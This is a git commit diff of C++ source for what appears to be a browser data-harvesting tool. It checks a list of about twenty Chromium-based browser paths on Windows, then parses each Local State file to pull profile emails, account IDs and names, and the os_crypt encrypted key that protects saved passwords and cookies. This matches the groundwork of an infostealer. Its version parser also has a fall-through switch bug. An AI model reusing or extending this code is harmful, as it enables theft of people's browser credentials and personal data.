7c4b49ed1bceab722aec1237ed78c3c24d7d45e9
Bhasher <bhasher.anonyme@gmail.com>
2020-05-14 23:42:48 +0200

    2020.14.05.2

--- src/components/chrome.cpp
+++ src/components/chrome.cpp
@@ -2,53 +2,147 @@
 // Created by Bhasher on 01/05/2020.
 //
 
-#include <filesystem>
-#include <random>
+#include <iostream>
+#include <tuple>
 #include <vector>
+#include <string>
+#include <fstream>
+#include <cassert>
+#include <sstream>
+
 #include "chrome.h"
-#include "../utils/rand.h"
+
+#include "../../contrib/rapidjson/istreamwrapper.h"
+#include "../../contrib/rapidjson/document.h"
 
 /**
- * @brief Search all chrome-based profiles path.
- * @details Explore a lot of potentials profiles paths and check if it exist and is a valid chrome-based profile path.
- * Supported navigators are Google Chrome,
- * @return a vector of profile paths.
+ * @brief Convert theoretical path to practical path
+ * @return the practical path
  */
-std::vector<std::string> getProfilesPath(){
-    std::vector<std::string> profilesPath;
-
-    return profilesPath;
+std::string ChromiumBasedBrowser::getPath() const {
+    auto const first{std::string(ChromiumBasedBrowser::location).find('{')+1};
+    auto const last{std::string(ChromiumBasedBrowser::location).find('}')};
+    std::string const content{std::string(ChromiumBasedBrowser::location).substr(first, last-first)};
+    std::string result{ChromiumBasedBrowser::location};
+    result.replace(first-1, last-first+2, std::getenv(content.c_str()));
+    return result;
 }
 
 /**
- * @brief Execute the *Chrome Component* and extract everything he can from chrome's data.
- * @return if execution finish correctly.
+ * @brief Extract all interesting data from Local State.
+ * @details Extract thoses data:
+ *  - Profiles data.
+ *  - OS encryption key
+ *
+ * @param Chrome user data path.
+ *
+ * @pre The chromeUserDataPath path must exist
+ * @pre The Local State file must exist
+ *
+ * @todo copy file
+ * @todo scrap plugins
+ *
+ * @return
  */
-bool Chrome::execute() {
-    return true;
-}
+std::tuple<std::vector<Profile>, std::string> Chrome::extractLocalState(std::string const &chromeUserDataPath){
+    assert(std::filesystem::exists(chromeUserDataPath) && "chromeUserDataPath doesn't exist");
+    assert(std::filesystem::exists(chromeUserDataPath + "Local State") && "Local State file doesn't exist");
 
-/**
- * @brief Check if chrome default profile exist.
- * @details Check if google chrome default profile exist. If so, add it to the `profilesPath` vector.
- * @todo Exceptions are not yet handled.
- * @todo Profiles paths in others locations are not yet scrapped.
- * @return if Chrome can be scrapped.
- */
-bool Chrome::can() {
-    std::filesystem::path chromePath{std::getenv("LOCALAPPDATA")};
-    chromePath /= "Google\\Chrome\\User Data\\Default";
-    if(!std::filesystem::exists(chromePath)){
-        return false;
+    std::ifstream ifs(chromeUserDataPath + "Local State");
+    rapidjson::IStreamWrapper isw(ifs);
+    rapidjson::Document localState;
+    localState.ParseStream(isw);
+
+    std::vector<Profile> profiles{};
+
+    if(localState.HasMember("profile") && localState["profile"].HasMember("info_cache")){
+        for(auto itr{localState["profile"]["info_cache"].MemberBegin()};itr!=localState["profile"]["info_cache"].MemberEnd();itr++){
+
+            std::string const name{itr->name.GetString()};
+
+            std::filesystem::path const path{std::filesystem::exists(chromeUserDataPath + name) ? chromeUserDataPath + name:""};
+
+            auto valueIfExist = [&itr](std::string const &cName) -> std::string {
+                return itr->value.HasMember(cName.c_str()) && itr->value[cName.c_str()].IsString() ? itr->value[cName.c_str()].GetString():"None";
+            };
+
+            double const lastUsing{itr->value.HasMember("active_time") && itr->value["active_time"].IsDouble() ? itr->value["active_time"].GetDouble():-1};
+            std::string const customName{valueIfExist("gaia_given_name")};
+            std::string const customFullName{valueIfExist("gaia_name")};
+            std::string const customShortcutName{valueIfExist("shortcut_name")};
+            std::string const id{valueIfExist("gaia_id")};
+            std::string const pictureName{valueIfExist("gaia_picture_file_name")};
+            std::string const pictureUrl{valueIfExist("last_downloaded_gaia_picture_url_with_size")};
+            std::string const officialName{valueIfExist("name")};
+            std::string const email{valueIfExist("user_name")};
+
+            profiles.push_back({
+                                       name,
+                                       path,
+                                       lastUsing,
+                                       customName,
+                                       customFullName,
+                                       customShortcutName,
+                                       id,
+                                       pictureName,
+                                       pictureUrl,
+                                       officialName,
+                                       email
+                               });
+
+        }
     }
-    Chrome::profilesPath.push_back(chromePath);
-    return true;
+
+    std::string const encrypted_key{
+            localState.HasMember("os_crypt") && localState["os_crypt"].HasMember("encrypted_key") && localState["os_crypt"]["encrypted_key"].IsString() ?
+            localState["os_crypt"]["encrypted_key"].GetString() : ""};
+
+    return std::tuple<std::vector<Profile>, std::string>{profiles, encrypted_key};
+
 }
 
-std::unordered_map<std::string, std::vector<History>> Chrome::getHistory() {
-    for(std::filesystem::path const &path: Chrome::profilesPath){
-        std::string tempFile{"History" + Rand::randString(4)};
-        //db::copyDB(path / "History", std::filesystem::temp_directory_path() / tmpFile));
+/**
+ * @brief Browse the list of potential browsers and return those who are present
+ * @return A vector of existing browsers
+ */
+std::vector<ChromiumBasedBrowser> Chrome::presentBrowsers(){
+    std::vector<ChromiumBasedBrowser> presentBrowsers{};
+    for(ChromiumBasedBrowser const &chromiumBasedBrowser : chromiumBasedBrowsers){
+        if(std::filesystem::exists(chromiumBasedBrowser.getPath())){
+            presentBrowsers.push_back(chromiumBasedBrowser);
+        }
     }
-    return Navigator::getHistory();
+    return presentBrowsers;
+}
+
+std::tuple<int, int, int, int> Chrome::getVersion(const std::string &chromeUserDataPath) {
+    assert(std::filesystem::exists(chromeUserDataPath) && "chromeUserDataPath doesn't exist");
+    assert(std::filesystem::exists(chromeUserDataPath + "Last Version") && "Last Version file doesn't exist");
+
+    std::ifstream lastVersionFile{chromeUserDataPath + "Last Version"};
+    std::tuple<int, int, int, int> version{-1, -1, -1, -1};
+
+    std::string line;
+    unsigned short int i=0;
+    while(std::getline(lastVersionFile, line, '.')){
+        try{
+            switch (i) {
+                case 0: std::get<0>(version) = std::stoi(line);
+                case 1: std::get<1>(version) = std::stoi(line);
+                case 2: std::get<2>(version) = std::stoi(line);
+                case 3: std::get<3>(version) = std::stoi(line);
+            }
+        } catch (std::invalid_argument const &e) {
+#ifndef NDEBUG
+            std::cerr << "A value in 'Last Version' file (located in " << chromeUserDataPath << ") is not a integer." << std::endl;
+#endif
+        } catch (std::out_of_range const &e) {
+#ifndef NDEBUG
+            std::cerr << "A value in 'Last Version' file (located in " << chromeUserDataPath << ") is out of range." << std::endl;
+#endif
+        }
+        i++;
+    }
+
+    return version;
 }
--- src/components/chrome.h
+++ src/components/chrome.h
@@ -5,16 +5,61 @@
 #ifndef FLUSTERW_CHROME_H
 #define FLUSTERW_CHROME_H
 
-#include "navigator.h"
+#include <string>
+#include <filesystem>
 
-class Chrome : public Navigator {
+struct Profile{
+
+    std::string name;
+    std::filesystem::path path;
+    double lastUsing;
+    std::string customName;
+    std::string customFullName;
+    std::string customShortcutName;
+    std::string id;
+    std::string pictureName;
+    std::string pictureUrl;
+    std::string officialName;
+    std::string email;
+};
+
+struct ChromiumBasedBrowser{
+    const char* name;
+    const char* location;
+    std::string getPath() const;
+};
+
+ChromiumBasedBrowser const chromiumBasedBrowsers[]{
+    {"7Star",R"({LOCALAPPDATA}\7Star\7Star\User Data\)"},
+    {"amigo", R"({LOCALAPPDATA}\Amigo\User Data\)"},
+    {"brave", R"({LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\)"},
+    {"centbrowser", R"({LOCALAPPDATA}\CentBrowser\User Data\)"},
+    {"chedot", R"({LOCALAPPDATA}\Chedot\User Data\)"},
+    {"chrome canary", R"({LOCALAPPDATA}\Google\Chrome SxS\User Data\)"},
+    {"chromium", R"({LOCALAPPDATA}\Chromium\User Data\)"},
+    {"coccoc", R"({LOCALAPPDATA}\CocCoc\Browser\User Data\)"},
+    {"comodo dragon", R"({LOCALAPPDATA}\Comodo\Dragon\User Data\)"},
+    {"elements browser", R"({LOCALAPPDATA}\Elements Browser\User Data\)"},
+    {"epic privacy browser", R"({LOCALAPPDATA}\Epic Privacy Browser\User Data\)"},
+    {"google chrome", R"({LOCALAPPDATA}\Google\Chrome\User Data\)"},
+    {"kometa", R"({LOCALAPPDATA}\Kometa\User Data\)"},
+    {"opera", R"({APPDATA}\Opera Software\Opera Stable\)"},
+    {"orbitum", R"({LOCALAPPDATA}\Orbitum\User Data\)"},
+    {"sputnik", R"({LOCALAPPDATA}\Sputnik\Sputnik\User Data\)"},
+    {"torch", R"({LOCALAPPDATA}\Torch\User Data\)"},
+    {"uran", R"({LOCALAPPDATA}\uCozMedia\Uran\User Data\)"},
+    {"vivaldi", R"({LOCALAPPDATA}\Vivaldi\User Data\)"},
+    {"yandexBrowser", R"({LOCALAPPDATA}\Yandex\YandexBrowser\User Data\)"}
+};
+
+class Chrome {
 public:
-    using Navigator::Navigator;
-    Chrome(){name = "Chrome";}
-
-    bool execute() override;
-    bool can() override;
-    std::unordered_map<std::string, std::vector<History>> getHistory() override;
+    //Chrome();
+    //bool run();
+    static std::vector<ChromiumBasedBrowser> presentBrowsers();
+    static std::tuple<std::vector<Profile>, std::string> extractLocalState(std::string const &chromeUserDataPath);
+    static std::tuple<int, int, int, int> getVersion(std::string const &chromeUserDataPath);
+private:
 };
 
 
